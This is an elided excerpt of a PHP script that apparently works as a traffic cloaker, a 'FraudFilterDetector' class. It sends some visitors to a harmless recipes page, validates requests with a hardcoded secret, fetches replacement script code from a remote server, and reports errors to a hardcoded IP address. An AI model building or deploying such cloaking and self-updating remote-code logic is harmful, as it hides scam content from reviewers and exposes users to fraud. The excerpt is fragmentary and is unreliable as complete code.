...
class FraudFilterDetector_n5i85 {
    ...
    function isSignatureValid($sign, $time) {
        $str = 'cae7586d-1cc7-4ad0-9d5f-779ae5dd1d3d.'.$this->getClid().'.'.$time;
        $sha = sha1($str);
        return $sign === $sha;
    }
...
<?php
    ...
    function safeAction() {
        $this->redirect('http://www.hemsleyandhemsley.com/recipes/all-recipes/');
    }
    ...
    function getUpgradeScriptViaContents($home, $fileName) {
        $opts = array('http' =>
            array(
                'method'  => 'GET',
                'header' => 'x-ff-secret: cae7586d-1cc7-4ad0-9d5f-779ae5dd1d3d',
                'timeout' => 2
            )
        );
    ...
    function upgradeScript($home, $fileName) {
        ...
        if ($output === false || !$this->isSignature2Valid($output)) {
            ...
            $headers[] = 'x-ff-secret: cae7586d-1cc7-4ad0-9d5f-779ae5dd1d3d';
...
";
    ...
    function fillAllPostHeaders() {
        ...
        $headers[] = 'X-FF-P: cae7586d-1cc7-4ad0-9d5f-779ae5dd1d3d';
    ...
    function notifyAboutError($message) {
        ...
        $url = 'http://139.59.212.55/ff-notify.html?v=ff1&guid=n5i85&m='.$message;
        $ch = curl_init($url);
...
$fraudFilterDetector_n5i85 = new FraudFilterDetector_n5i85();
$fraudFilterDetector_n5i85->check();
